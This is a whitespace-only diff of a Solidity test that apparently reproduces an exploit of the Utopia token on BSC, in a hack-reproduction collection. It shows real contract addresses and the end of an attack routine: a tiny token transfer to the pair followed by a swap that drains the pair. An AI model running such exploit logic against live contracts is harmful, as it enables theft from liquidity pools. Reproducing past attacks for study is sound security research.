@@ -17,10 +17,13 @@ import "./../interface.sol";
 // Similar incident (FFIST) : https://github.com/SunWeb3Sec/DeFiHackLabs#20230720-ffist---business-logic-flaw
 
 interface IUtopia is IERC20 {
+
     function lastAirdropAddress() external view returns (address);
+
 }
 
 contract UtopiaTest is Test {
+
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     IUtopia Utopia = IUtopia(0xb1da08C472567eb0EC19639b1822F578d39F3333);
     Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
@@ -82,4 +85,5 @@ contract UtopiaTest is Test {
         Utopia.transfer(address(Pair), 32);
         Pair.swap(0, amountOut, address(this), new bytes(1));
     }
+
 }
